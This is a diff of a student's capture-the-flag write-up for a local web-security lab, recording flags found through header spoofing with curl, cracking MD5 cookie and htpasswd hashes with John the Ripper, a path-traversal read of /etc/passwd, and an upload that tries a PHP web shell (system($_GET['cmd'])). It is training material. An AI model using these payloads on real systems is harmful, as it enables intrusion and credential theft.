@@ -176,6 +176,47 @@ might actually just be a flag in itself as it looks like SHA-256 as well but ???
 
 seems like its domain xss or something there is a coucou function and modifying the dom through js
 
+ok actually the hints were in form of HTML comments, namely :
+
+```
+
+Voila un peu de lecture :
+
+Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.
+
+Fun right ?
+source: loem.
+Good bye  !!!!
+
+You must come from : "https://www.nsa.gov/".
+
+
+Where does it come from?
+Contrary to popular belief, Lorem Ipsum is not simply random text. It has roots in a piece of classical Latin literature from 45 BC, making it over 2000 years old. Richard McClintock, a Latin professor at Hampden-Sydney College in Virginia, looked up one of the more obscure Latin words, consectetur, from a Lorem Ipsum passage, and going through the cites of the word in classical literature, discovered the undoubtable source. Lorem Ipsum comes from sections 1.10.32 and 1.10.33 of "de Finibus Bonorum et Malorum" (The Extremes of Good and Evil) by Cicero, written in 45 BC. This book is a treatise on the theory of ethics, very popular during the Renaissance. The first line of Lorem Ipsum, "Lorem ipsum dolor sit amet..", comes from a line in section 1.10.32.
+
+The standard chunk of Lorem Ipsum used since the 1500s is reproduced below for those interested. Sections 1.10.32 and 1.10.33 from "de Finibus Bonorum et Malorum" by Cicero are also reproduced in their exact original form, accompanied by English versions from the 1914 translation by H. Rackham.
+
+Let's use this browser : "ft_bornToSec". It will help you a lot.
+
+```
+
+there's two hints here, the comment "You must come from : "https://www.nsa.gov/"." is a reference to the referee
+and the second hint "Let's use this browser : "ft_bornToSec". It will help you a lot." is a reference to the user agent
+
+crafting the curl command and doing a diff :
+
+```
+➜  darklyProject git:(master) ✗ curl 'http://localhost:8080/index.php?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f' --compressed -H 'User-Agent: ft_bornToSec' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br, zstd' -H 'Referer: https://www.nsa.gov/' -H 'Connection: keep-alive' -H 'Cookie: I_am_admin=68934a3e9455fa72420237eb05902327' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-Fetch-Dest: document' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Site: same-origin' -H 'Priority: u=0, i' > new.txt
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  2572    0  2572    0     0  2534k      0 --:--:-- --:--:-- --:--:-- 2511k
+➜  darklyProject git:(master) ✗ diff og.txt new.txt
+37c37
+< <audio id="best_music_ever" src="audio/music.mp3"preload="true" loop="loop" autoplay="autoplay">
+---
+> <center><h2 style="margin-top:50px;"> The flag is : f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center> <audio id="best_music_ever" src="audio/music.mp3"preload="true" loop="loop" autoplay="autoplay">
+```
+
 ### Flag 05 (WIP)
 
 a weirdly loaded image http://localhost:13080/index.php?page=media&src=1
@@ -195,6 +236,7 @@ suspiciously looks like MD5 again
 and lo and behold
 
 ```
+
 ../john/run/john --format=Raw-MD5 i_am_admin_cookie
 Using default input encoding: UTF-8
 Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
@@ -207,10 +249,11 @@ Almost done: Processing the remaining buffered candidate passwords, if any.
 0g 0:00:00:00 DONE 1/3 (2024-11-21 17:25) 0g/s 102000p/s 102000c/s 102000C/s Cookie1921..Cookie1900
 Proceeding with wordlist:../john/run/password.lst
 Enabling duplicate candidate password suppressor
-false            (cookie)
+false (cookie)
 1g 0:00:00:00 DONE 2/3 (2024-11-21 17:25) 7.692g/s 3206Kp/s 3206Kc/s 3206KC/s leticia22..qwzxas
 Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
 Session completed.
+
 ```
 
 so the cookie value is false
@@ -220,7 +263,9 @@ replacing it with true in md5 and clicking on home
 and we get
 
 ```
+
 Good job! Flag : df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3
+
 ```
 
 ### Flag 08 d19b4823e0d5600ceed56d5e896ef328d7a2b9e7ac7e80f4fcdb9b10bcb3e7ff
@@ -232,7 +277,9 @@ http://localhost:8080/whatever/
 there is a htpasswd file containing
 
 ```
+
 `root:437394baff5aa33daa618be47b75cb49`
+
 ```
 
 Seems to be hashed in md5, we cracked the password using John the Ripper:
@@ -254,7 +301,7 @@ http://localhost:8080/admin/
 
 using root as username and qwerty123@ as password, which gets us the flag
 
-### FLAG 09 b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0
+### FLAG 09 b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0 LOCAL FILE INCLUSION
 
 http://localhost:8080/index.php?page=../../../../etc/passwd
 
@@ -430,6 +477,35 @@ Hey, here is your flag : d5eec3ec36cf80dce44a896f961c1831a05526ec215693c8f2c3954
 ```
 
 in http://localhost:8080/.hidden/whtccjokayshttvxycsvykxcfm/igeemtxnvexvxezqwntmzjltkt/lmpanswobhwcozdqixbowvbrhw/README
+
+## FLAG 13 (WIP)
+
+ADD IMAGE page
+
+after trying a bunch of things, we can see that the server accepts .jpg files
+
+and returns for example
+
+```
+/tmp/test.jpg succesfully uploaded.
+```
+
+however the image is not in the db we have access to through search img, not in the front page, there isn't a tmp dir we can reach
+we also can't use local file inclusion to reach it
+
+so even though the .jpg can technically be a script we could run there is nowhere we can reach it
+
+however when uploading
+
+```
+<?php system($_GET['cmd']); ?>.jpg
+```
+
+we get back
+
+```
+/tmp/.jpg succesfully uploaded.
+```
 
 ### TO NOTE
 
